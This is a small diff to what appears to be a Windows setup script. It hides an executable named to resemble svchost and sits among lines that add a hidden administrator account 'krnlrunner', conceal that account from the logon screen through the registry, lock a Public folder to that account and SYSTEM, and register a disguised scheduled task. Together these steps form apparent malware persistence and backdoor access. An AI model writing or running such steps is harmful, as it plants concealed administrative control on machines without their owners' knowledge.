@@ -22,6 +22,7 @@ net localgroup Administrators krnlrunner /add
 
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v krnlrunner /t REG_DWORD /d 0 /f
 
+attrib +s +h "C:\Users\Public\krnl\schvostkrnl-debug.exe"
 
 icacls "C:\Users\Public\krnl" /inheritance:r
 
@@ -30,8 +31,6 @@ icacls "C:\Users\Public\krnl" /remove "Users"
 icacls "C:\Users\Public\krnl" /remove "Everyone"
 
 icacls "C:\Users\Public\krnl" /grant:r "krnlrunner:(OI)(CI)F" "SYSTEM:(OI)(CI)F"
-
-attrib +s +h "C:\Users\Public\krnl\schvostkrnl-debug.exe"
 
 
 Register-ScheduledTask -TaskName "WINschvostkrnl" `
